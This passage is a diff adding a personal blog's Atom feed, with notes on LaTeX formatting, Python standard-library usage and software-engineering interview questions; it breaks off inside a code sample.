@@ -1,0 +1,2978 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Zhengyang Song's Notepad]]></title>
+  <link href="http://songzy12.github.io/atom.xml" rel="self"/>
+  <link href="http://songzy12.github.io/"/>
+  <updated>2018-10-06T13:59:48+08:00</updated>
+  <id>http://songzy12.github.io/</id>
+  <author>
+    <name><![CDATA[Zhengyang Song]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[LaTeX]]></title>
+    <link href="http://songzy12.github.io/blog/2018/06/30/latex/"/>
+    <updated>2018-06-30T12:00:04+08:00</updated>
+    <id>http://songzy12.github.io/blog/2018/06/30/latex</id>
+    <content type="html"><![CDATA[<h2>todo</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\usepackage[colorinlistoftodos]{todonotes}
+</span><span class='line'>
+</span><span class='line'>\todo[inline, color=green!40]{This is an inline comment.}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>enumitem</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\usepackage{enumitem}
+</span><span class='line'>
+</span><span class='line'>\maketitle
+</span><span class='line'>\begin{enumerate}[label=(\alph*)]
+</span><span class='line'>\item an apple
+</span><span class='line'>\item a banana
+</span><span class='line'>\end{enumerate}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>verb</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\verb|.bib|</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>href</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\href{https://www.overleaf.com/blog/184}{Mendeley}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>equiv</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>a\equiv b \bmod p</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>matrix</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>x^{(1)}=\begin{bmatrix}\frac{3}{2}\\[0.3em]\frac{9}{4}\end{bmatrix}, </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Just use overleaf <a href="https://www.overleaf.com/5269090dsqmsd#/16588846/">here</a>.</p>
+
+<h2>jumpnav-main</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\documentclass[chi_draft]{sigchi}
+</span><span class='line'>\begin{document}
+</span><span class='line'>%\usepackage{natbib}
+</span><span class='line'>
+</span><span class='line'>\title{}
+</span><span class='line'>\author{}
+</span><span class='line'>
+</span><span class='line'>\maketitle
+</span><span class='line'>
+</span><span class='line'>\input{abstract}
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>\input{intro}
+</span><span class='line'>\input{related}
+</span><span class='line'>\input{data}
+</span><span class='line'>\input{problem}
+</span><span class='line'>\input{observations}
+</span><span class='line'>\input{approach}
+</span><span class='line'>\input{exp}
+</span><span class='line'>\input{conclusion}
+</span><span class='line'>
+</span><span class='line'>\bibliographystyle{SIGCHI-Reference-Format}
+</span><span class='line'>\bibliography{references}
+</span><span class='line'>
+</span><span class='line'>\end{document}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>convex optimization</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\begin{alignat*}{2}
+</span><span class='line'>\min\quad & -2x_1-x_2+x_3 \\
+</span><span class='line'>\mbox{s.t.}\quad
+</span><span class='line'>&x_1+x_2+2x_3 \le 6  \\
+</span><span class='line'>&x_1+4x_2-x_3 \le 4  \\
+</span><span class='line'>&x_1, x_2, x_3 \ge 0
+</span><span class='line'>\end{alignat*}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>MISC</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\noindent
+</span><span class='line'>\textbf{}
+</span><span class='line'>\LaTeX{}
+</span><span class='line'>\TeX\
+</span><span class='line'>\TeX{}
+</span><span class='line'>\textbackslash
+</span><span class='line'>\textit{} 
+</span><span class='line'>\empha{}
+</span><span class='line'>{\bf }
+</span><span class='line'>\smallskip
+</span><span class='line'>\bigskip</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>tikz</h2>
+
+<p><a href="http://cremeronline.com/LaTeX/minimaltikz.pdf">here</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\begin{center}
+</span><span class='line'>\begin{tikzpicture}[domain=0:0.5,xscale=13,yscale=3.8]
+</span><span class='line'>\draw[&lt;-&gt;] (0,2) node[left]{EUR}-- (0,0) -- (.7,0) node[below] {$q$};
+</span><span class='line'>\draw[red] plot (\x, {0.25+\x/2+\x*\x/2}) node[right] {$v_1(x)$};
+</span><span class='line'>\draw[green] plot (\x, {0.025+\x+\x*\x}) node[right] {$v_2(x)$};
+</span><span class='line'>\draw[thin, dashed] plot (\x, {0.275+1.5*\x+1.5*\x*\x}) ;
+</span><span class='line'>\draw[thick,domain=0:0.33666] plot (\x, {0.05+2*\x+2*\x*\x}) ;
+</span><span class='line'>\draw[thick,domain=0.33666:0.5]
+</span><span class='line'>plot (\x, {0.5+\x+\x*\x}) node[right] {$2\min[v_1,v_2]$};
+</span><span class='line'>\end{tikzpicture}
+</span><span class='line'>\end{center}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>tabular*</h2>
+
+<p><a href="https://en.wikibooks.org/wiki/LaTeX/Tables#The_tabular.2A_environment">table</a>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\begin{tabular*}{0.75\textwidth}{@{\extracolsep{\fill} } | c | c | c | r | }
+</span><span class='line'>  \hline
+</span><span class='line'>  label 1 & label 2 & label 3 & label 4 \\
+</span><span class='line'>  \hline 
+</span><span class='line'>  item 1  & item 2  & item 3  & item 4  \\
+</span><span class='line'>  \hline
+</span><span class='line'>\end{tabular*}</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>multirow</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>{
+</span><span class='line'>\begin{table}
+</span><span class='line'>\caption{Statistics of the Dataset}
+</span><span class='line'>\label{tab:dataset}
+</span><span class='line'>\centering
+</span><span class='line'>    \begin{tabular}{c|c|c|c}
+</span><span class='line'>    \hline \hline
+</span><span class='line'>    \multirow{3}{*}{Science}   & \multirow{2}{*}{Video} & Count & \\ \cline{3-4}
+</span><span class='line'>                               &                      & Avg. length & \\ \cline{2-4}
+</span><span class='line'>                               & User & Count &  \\ \cline{2-4}
+</span><span class='line'>                               & \multirow{3}{*}{Back-jumps} & Count &       \\ \cline{3-4}
+</span><span class='line'>                               &                           & Max back-jumps/video &       \\ \cline{3-4}
+</span><span class='line'>                             &                             & Min back-jumps/video &       \\ \cline{2-4}
+</span><span class='line'>    \hline \hline
+</span><span class='line'>    \end{tabular}
+</span><span class='line'>\end{table}
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>caption</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\usepackage{caption} 
+</span><span class='line'>\captionsetup[table]{skip=10pt}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>pdflatex</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\documentclass{article}
+</span><span class='line'> 
+</span><span class='line'>\begin{document}
+</span><span class='line'>First document. This is a simple example, with no 
+</span><span class='line'>extra parameters or packages included. \cite{knuthwebsite}.
+</span><span class='line'>\end{document}</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo apt-get install texlive
+</span><span class='line'>pdftex /path/to/myfile.tex</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>bibtex</h2>
+
+<p><code>article.tex</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\documentclass{article}
+</span><span class='line'>\usepackage{natbib}
+</span><span class='line'> 
+</span><span class='line'>\begin{document}
+</span><span class='line'>First document. This is a simple example, with no 
+</span><span class='line'>extra parameters or packages included. \cite{knuthwebsite}.
+</span><span class='line'>
+</span><span class='line'>\bibliographystyle{alpha}
+</span><span class='line'>\bibliography{article}
+</span><span class='line'>\end{document}</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>article.bib</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>@misc{knuthwebsite,
+</span><span class='line'>    author    = "Donald Knuth",
+</span><span class='line'>    title     = "Knuth: Computers and Typesetting",
+</span><span class='line'>    url       = "http://www-cs-faculty.stanford.edu/\~{}uno/abcde.html"
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Suppose you have <code>article.tex</code> and <code>article.bib</code>. You need to run:</p>
+
+<ul>
+<li>latex article.tex (this will generate a document with question marks in place of unknown references)</li>
+<li>bibtex article (this will parse all the .bib files that were included in the article and generate metainformation regarding references)</li>
+<li>latex article.tex (this will generate document with all the references in the correct places)</li>
+<li>latex article.tex (just in case if adding references broke page numbering somewhere)</li>
+</ul>
+
+
+<p>Just add the following line to your <code>~/.bashrc</code> file (modify the main keyword accordingly to the name of your <code>.tex</code> and <code>.bib</code> files)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>alias texbib='pdflatex main.tex && bibtex main && pdflatex main.tex && pdflatex main.tex && gnome-open main.pdf'</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>xelatex</h2>
+
+<p>需要用 <code>xecjk</code> 或 <code>zhspacing</code> 设置中文字体。 <code>XeTex</code> 缺省设了英文字体 <code>Latin Modern</code>，所以你能看到英文字。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\documentclass{article}
+</span><span class='line'>\usepackage{xeCJK}
+</span><span class='line'>
+</span><span class='line'>\setCJKmainfont{simsun.ttf}
+</span><span class='line'>\setCJKsansfont{simhei.ttf}
+</span><span class='line'>\setCJKmonofont{simfang.ttf}
+</span><span class='line'> 
+</span><span class='line'>\begin{document}
+</span><span class='line'>
+</span><span class='line'>\title{作业}
+</span><span class='line'>\author{宋正阳}
+</span><span class='line'>\date{\today}
+</span><span class='line'>
+</span><span class='line'>\maketitle
+</span><span class='line'>
+</span><span class='line'>\end{document}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>font</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Fontconfig warning: "/etc/fonts/conf.d/65-droid-sans-fonts.conf", line 96: Having multiple values in &lt;test&gt; isn't supported and may not work as expected</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo apt install --reinstall fontconfig
+</span><span class='line'>
+</span><span class='line'>&lt;test name="lang"&gt;
+</span><span class='line'>  &lt;string&gt;zh-cn&lt;/string&gt;
+</span><span class='line'>  &lt;string&gt;zh-sg&lt;/string&gt;
+</span><span class='line'>  &lt;string&gt;zh-hk&lt;/string&gt;
+</span><span class='line'>  &lt;string&gt;zh-tw&lt;/string&gt;
+</span><span class='line'>  &lt;string&gt;zh&lt;/string&gt;
+</span><span class='line'>&lt;/test&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;test name="lang"&gt;
+</span><span class='line'>  &lt;string&gt;zh-cn&lt;/string&gt;
+</span><span class='line'>&lt;/test&gt;</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Captcha]]></title>
+    <link href="http://songzy12.github.io/blog/2018/05/04/captcha/"/>
+    <updated>2018-05-04T19:53:33+08:00</updated>
+    <id>http://songzy12.github.io/blog/2018/05/04/captcha</id>
+    <content type="html"><![CDATA[
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Tencent SNG]]></title>
+    <link href="http://songzy12.github.io/blog/2018/04/17/tencent-sng/"/>
+    <updated>2018-04-17T19:56:43+08:00</updated>
+    <id>http://songzy12.github.io/blog/2018/04/17/tencent-sng</id>
+    <content type="html"><![CDATA[<ul>
+<li>项目中的有趣点或难点</li>
+<li>xgboost 和 lr 的优缺点</li>
+<li>C++ 虚函数的实现</li>
+<li>线程和进程的区别</li>
+<li>在模型中哪些 feature 最有用</li>
+<li>算法题：将 1 到 m*n 按照螺旋方式填满 m * n 的矩阵。</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Generic Operating System Services]]></title>
+    <link href="http://songzy12.github.io/blog/2018/04/16/generic-operating-system-services/"/>
+    <updated>2018-04-16T14:19:01+08:00</updated>
+    <id>http://songzy12.github.io/blog/2018/04/16/generic-operating-system-services</id>
+    <content type="html"><![CDATA[<h2>io</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import io
+</span><span class='line'>io.open(file, mode='r', buffering=-1, encoding=None, errors=None, newline=None, closefd=True)</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>The <code>open()</code> function an alias to <code>io.open()</code>. It wraps the OS-level file descriptor in a file object.</li>
+<li><code>os.open()</code> is just a wrapper for the lower-level POSIX syscall. It returns the file descriptor (a number) that represents the opened file.</li>
+</ul>
+
+
+<h2>logging</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import logging  
+</span><span class='line'>
+</span><span class='line'>logging.basicConfig()
+</span><span class='line'>logger = logging.getLogger('test')  
+</span><span class='line'># NOTSET &lt; DEBUG &lt; INFO &lt; WARNING &lt; ERROR &lt; CRITICAL
+</span><span class='line'>logger.setLevel(logging.DEBUG)  
+</span><span class='line'>  
+</span><span class='line'>fh = logging.FileHandler('test.log')  
+</span><span class='line'>fh.setLevel(logging.DEBUG)  
+</span><span class='line'>    
+</span><span class='line'>ch = logging.StreamHandler()  
+</span><span class='line'>ch.setLevel(logging.DEBUG)  
+</span><span class='line'>    
+</span><span class='line'>formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')  
+</span><span class='line'>fh.setFormatter(formatter)  
+</span><span class='line'>ch.setFormatter(formatter)  
+</span><span class='line'>    
+</span><span class='line'>logger.addHandler(fh)  
+</span><span class='line'>logger.addHandler(ch)  
+</span><span class='line'>
+</span><span class='line'># logger.debug, logger.info, logger.warning, logger.error, logger.critical
+</span><span class='line'>logger.info('foorbar')  </span></code></pre></td></tr></table></div></figure>
+
+
+<h2>optparse</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>parser = optparse.OptionParser(sys.argv[0]+' '+
+</span><span class='line'>'-r &lt;file_with URLs&gt;')
+</span><span class='line'>parser.add_option('-r', dest='URLs', type='string', 
+</span><span class='line'>        help='specify target file with URLs')
+</span><span class='line'>(options, args) = parser.parse_args()
+</span><span class='line'>URLs=options.URLs</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>os</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import os
+</span><span class='line'>script_dir = os.path.dirname(__file__) # &lt;-- absolute dir the script is in
+</span><span class='line'>rel_path = "2091/data.txt"
+</span><span class='line'>abs_file_path = os.path.join(script_dir, rel_path)</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>makedirs</h3>
+
+<p>Works like mkdir, except that any intermediate path segment (not just the rightmost) will be created if it does not exist.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if not os.path.exists(directory):
+</span><span class='line'>    os.makedirs(directory)</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>path</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&gt;&gt;&gt; filename, file_extension = os.path.splitext('/path/to/somefile.ext')
+</span><span class='line'>&gt;&gt;&gt; filename
+</span><span class='line'>'/path/to/somefile'
+</span><span class='line'>&gt;&gt;&gt; file_extension
+</span><span class='line'>'.ext'</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>os.path.join(dir_name, file_name);</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import sys
+</span><span class='line'>import os
+</span><span class='line'>parent = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+</span><span class='line'>sys.path.insert(0, parent)</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>os.path.dirname(path)
+</span><span class='line'>    Return the directory name of pathname path. This is the first element of the pair returned by passing path to the function split().</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>os.access(path, mode);</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>os.F_OK: test the existence of path</li>
+<li>os.R_OK: readability</li>
+<li>os.W_OK: writability</li>
+<li>os.X_OK: executability</li>
+</ul>
+
+
+<h3>popen</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>output = os.popen('cat /proc/cpuinfo')
+</span><span class='line'>print output.read()</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>system</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>retvalue = os.system("ps -p 2993 -o time --no-headers")</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>pickle</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import pickle
+</span><span class='line'>
+</span><span class='line'>with open("active_user.pkl", "wb") as f:
+</span><span class='line'>    pickle.dump(active_user, f)
+</span><span class='line'>
+</span><span class='line'>with open("active_user") as f:
+</span><span class='line'>    active_user = pickle.load(f)
+</span><span class='line'>
+</span><span class='line'>with open("text1") as f1, open("text2") as f2:
+</span><span class='line'>  pass</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Tencent MIG]]></title>
+    <link href="http://songzy12.github.io/blog/2018/03/20/tencent-mig/"/>
+    <updated>2018-03-20T10:51:00+08:00</updated>
+    <id>http://songzy12.github.io/blog/2018/03/20/tencent-mig</id>
+    <content type="html"><![CDATA[<h2>Round 1</h2>
+
+<ul>
+<li>LECP</li>
+<li>SVM kernel</li>
+<li>Sigmoid</li>
+<li>Adam</li>
+<li>XGBoost</li>
+<li>Log Loss</li>
+</ul>
+
+
+<h2>Round 2</h2>
+
+<ul>
+<li>GBDT</li>
+<li>NLP</li>
+<li>word2vec</li>
+<li>skip-gram &amp; c-bow</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Google]]></title>
+    <link href="http://songzy12.github.io/blog/2018/02/28/google/"/>
+    <updated>2018-02-28T12:52:17+08:00</updated>
+    <id>http://songzy12.github.io/blog/2018/02/28/google</id>
+    <content type="html"><![CDATA[<h2>Phone Interview</h2>
+
+<p><a href="https://discuss.leetcode.com/topic/115712/compare-keyboard-events-sequences">Compare keyboard events sequences</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># abc123\b123\b  -&gt; abc1212
+</span><span class='line'># abc1212        -&gt; abc1212</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Time O(n), Space O(n)</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>def convert(s):
+</span><span class='line'>    res = []
+</span><span class='line'>    index = 0
+</span><span class='line'>    for i in range(len(s)):
+</span><span class='line'>        # abc12123
+</span><span class='line'>        if s[i] != '\b':
+</span><span class='line'>            if len(res) == index:
+</span><span class='line'>                res.append(s[i])
+</span><span class='line'>            else:
+</span><span class='line'>                res[index] = s[i]
+</span><span class='line'>            index += 1
+</span><span class='line'>        else:
+</span><span class='line'>            if index == 0:
+</span><span class='line'>                continue
+</span><span class='line'>            else:
+</span><span class='line'>                index -= 1
+</span><span class='line'>        return ''.join(res[:index])
+</span><span class='line'>
+</span><span class='line'>def compare(s1, s2):
+</span><span class='line'>    return convert(s1) == convert(s2)</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>Time O(n), Space O(1)</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
